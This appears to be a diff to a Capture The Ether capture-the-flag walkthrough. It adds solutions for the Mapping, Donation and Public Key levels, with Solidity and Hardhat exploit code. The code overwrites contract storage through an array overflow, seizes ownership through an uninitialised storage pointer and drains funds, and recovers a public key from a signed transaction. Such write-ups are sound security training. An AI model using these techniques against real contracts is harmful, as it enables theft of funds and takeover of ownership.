@@ -4,6 +4,9 @@ Walkthrough every level of the Capture The Ether CTF
 
 # Note About the Walkthrough
 
+## Complete Walkthrough
+Depending on the level it is solved with a Remix Session, a Hardhat Script or a Deployed Contract. For those levels on which scripts or custom contracts are used, the complete walkthroughs are located within the `Hardhat_Scripts` folder.
+
 ## Usage of Interfaces
 Whenever any other external contracts are called, an interface with the called functions is created as a helper in order to make things easier and avoid having to create an encoded payload with each function selector followed by the usage of `_to.call{value: _val}(payload)`. 
 
@@ -335,7 +338,8 @@ The main vulnerability of this level is within the `collectPenalty()` function w
 
 The first one is by sending a regular transfer to the contract. This is only possible if the contract implements a payable fallback function (such as a `fallback payable` itself or `receive payable`). Because the contract does not implement those functions, this way is discarded.
 
-Useful link and quote for the following ways: [SWC-132] 
+Useful link and quote for the following ways: [SWC-132](https://swcregistry.io/docs/SWC-132):
+>Contracts can behave erroneously when they strictly assume a specific Ether balance. It is always possible to forcibly send ether to a contract (without triggering its fallback function), using selfdestruct, or by mining to the account. In the worst case scenario this could lead to DOS conditions that might render the contract unusable.
 
 The second one is by precalculating the address of the level contract and send 1 wei to that address. To do so, it is only needed to know the address of the deployer and the current nonce of that address. This Python script precalculates the address by knowing both the deployers' address and nonce (values that can be get by surfing etherscan for example):
 
@@ -375,4 +379,145 @@ The following contract performs this in one step:
     }
 
 
-Once the balance of the instance is slightly increased, it is needed to call `collectPenalty()` and that's it!
+Having the levels' balance slightly increased, it is needed to call `collectPenalty()` and that's it!
+
+
+### Mapping
+
+Following the idea of math within the shadows of compilers below `0.8.0`, the idea is to cause an overflow of the array. But... why? On state variables, if the value underflows or overflows what happens is that the new value will be the biggest or smallest of that variable type. This concept can be extrapolated to memory slots of a contract. If we cause an overflow (or underflow) in the array size, we can take control over any slot of the contract. Because this level provides a function that allows any user to overflow the array and also assign a value to the pointed slot, the solution is quite straight forward.
+
+Before solving the level, we need to get a key value that points to that slot. Regarding memory layout, according to the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#mappings-and-dynamic-arrays):
+
+>Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes. Dynamic arrays of dynamic arrays apply this rule recursively. The location of element x[i][j], where the type of x is uint24[][], is computed as follows (again, assuming x itself is stored at slot p): The slot is keccak256(keccak256(p) + i) + floor(j / floor(256 / 24)) and the element can be obtained from the slot data v using (v >> ((j % floor(256 / 24)) * 24)) & type(uint24).max.
+
+So, the slot id expressed in `bytes32` can be calculated by using `keccak256(bytes32(slotNum))`. In here there is a simple implementation that calculates the key value that we need to write:
+
+    contract SlotCalculator {
+        
+        bytes32 public slotOne;
+        uint public index;
+
+        function getKey() public {
+            slotOne = keccak256(bytes32(1));
+            index = uint256(-1) - uint(slotOne) + 1;
+        }
+        
+    // Returned:     
+    // 35707666377435648211887908874984608119992236509074197713628505308453184860938
+    }
+
+Because the slot is located in the beginning of the contract, we are targeting it. Then, we can simply paste the level code in a Remix session and get the contract at address and call:
+
+    level.set(
+        35707666377435648211887908874984608119992236509074197713628505308453184860938,
+        1
+    )
+
+And this level will be solved! (P.S. The `1` means `true`!)
+
+
+### Donation
+
+This level illustrates something that has been patched in newer Solidity versions. The memory layout while declaring temporary variables inside functions. This level, intends to use a temporary mock of the `Donation` struct in order to assign values to each variable of the struct so then they can be pushed into the `donations` array. If you try to use this on newer Solidity versions, the compiler enforces you specifying "storage" or "memory" while declaring the temporary `donation`  variable inside `donate()`. On older compiler versions, if no memory pointer is explicitly written, storage is assumed. 
+
+So, what is the donate function doing in terms of the donation storage it is literally overwriting the `donations.length` with `now` (current `block.timestamp`) and changing the `owner` address for the casted value of `etherAmount`.
+
+An address fits into `160 bits`, on older compiler versions this casting is made implicitly `uint256(_theAddress)`. On newer versions, we need to cast it first to a 160 bit variable like so:
+`uint256(uint160(_theAddress))`. So, because the "temporary" storage `donation.etherAmount` overwrites the `owner` address, we have to call `donate(castedAddress)`. 
+
+The level also enforces us to send a specific `msg.value`. Using the `ether` keyword basically adds 18 decimals to 1. Meaning that in terms of memory, it stores `1 * 10**18` within a `uint256`. So, the scale essentially is `10**18 * 1*10**18 = 10**(18+18) = 10**36`. A casted address can be for example: `920255333442317583480139510186451040404997320085`, which are... `920,255,333,442,317,583,480,139,510,186 ether`. An amount quite difficult to get... but thanks to the scale, now that amount turns into: `920255333442 wei = 920.25 gwei = dusty ether`, a more attainable amount.
+
+Using `DonationAttacker.attackDonation(attackerContractAddress)`, the level is solved (the detailed contract is within the `Hardhat_Scripts` folder):
+
+    function attackDonation(address _newOwner) external payable {
+        uint256 castedAddress = castAddress(_newOwner);
+        require(msg.value == castedAddress / SCALE);
+
+        levelInstance.donate{value: msg.value}(castedAddress);
+
+        levelInstance.withdraw();
+        require(levelInstance.isComplete(), "!Completed"); 
+
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success, "!success");
+    }
+
+The following script is also used to solve this:
+
+    it("Exploiting...", async function () {
+        const [owner] = await ethers.getSigners();
+        const instanceAddr = "0x08cc17fb3566B1d55F2acC571D0BAd92aa5C6aEe";
+
+        const Attacker = await ethers.getContractFactory("DonationAttacker");
+        const attacker = await Attacker.deploy(instanceAddr);
+        await attacker.deployed();
+
+        console.log(`"Deployed" attacker at ${attacker.address}`);
+
+        const castedAddress = await attacker.castAddress(attacker.address);
+        const exactMsgValue = await attacker.calculateMsgValue(castedAddress);
+
+        await attacker.attackDonation(attacker.address, {value:exactMsgValue});
+    });
+
+
+## Accounts
+
+### Fuzzy Identity
+
+
+### Public Key
+This level has two ways to find the solution. The first one is the "straight" and intended way to do so whereas the second one is an unorthodox way but pretty important as a reminder of data availability on the blockchain.
+
+The first way is by finding the hash that points to the public key. The level checks this step in order to set the completion as true:
+
+    function authenticate(bytes publicKey) public {
+        require(address(keccak256(publicKey)) == owner);
+
+        isComplete = true;
+    }
+
+We can see by going to ropsten etherscan that the address `0x92b28647ae1f3264661f72fb2eb9625a89d88a31` has one outgoing transaction. This is extremely useful because that txn was indeed signed by that owner.
+We can retrieve the data we need to pass to `authenticate` by scoping the parameters involved on that transaction, precisely by using the ECDSA signature parameters. On ECDSA `(r,s,v)`, none of those parameters is indeed the public key but the address of the one who made that signature can be recovered by matching the signed message with the used signature.
+
+The following script performs this process.
+
+    const outGoingTxHash = "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb";
+    const tx = await ethers.provider.getTransaction(outGoingTxHash);
+    
+    console.log(`Signature Values:`);
+    console.log(`r: ${tx.r}`);
+    console.log(`s: ${tx.s}`);
+    console.log(`v: ${tx.v}`);
+
+    const signature = {
+        r: tx.r, 
+        s: tx.s, 
+        v: tx.v
+    };
+
+    const txData = {
+        nonce: tx.nonce,
+        gasPrice: tx.gasPrice, 
+        gasLimit: tx.gasLimit,
+        to: tx.to,
+        value: tx.value,
+        data: tx.data,
+        chainId: tx.chainId
+    };
+
+    const signedData = ethers.utils.serializeTransaction(txData);
+    const msgHash = ethers.utils.keccak256(signedData);
+
+    // This will have a 04 after the 0x at the beginning. This indicates that it is a raw address.
+    const rawPubKey = ethers.utils.recoverPublicKey(msgHash, signature);
+    console.log(`Raw Key: ${rawPubKey}`); 
+
+    let publicKey = `0x${rawPubKey.slice(4)}`;
+
+Then we simply need to call `authenticate(publicKey)` and the level is solved!
+
+The second way to solve this is by diving into the deep waters of Etherscan and find someone who had already solved this level and look at the parameters sent to `authenticate()`, because the level will be the same for everybody, the solution will also be constant (not the case if the level uses a salt, timestamps, sender address and so on). 
+First, by going to the internal transaction of the deployment we see that the factory is `0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee`. Every transaction that lands to this contract is to check if the level is completed. So in order to find the proper data, we need to find a user that completed this level, locate the authenticate call of his level instance and simply copy-paste the authenticate key.
+
+The last way to solve this is a clear reminder that everything is public on the Ethereum chain!
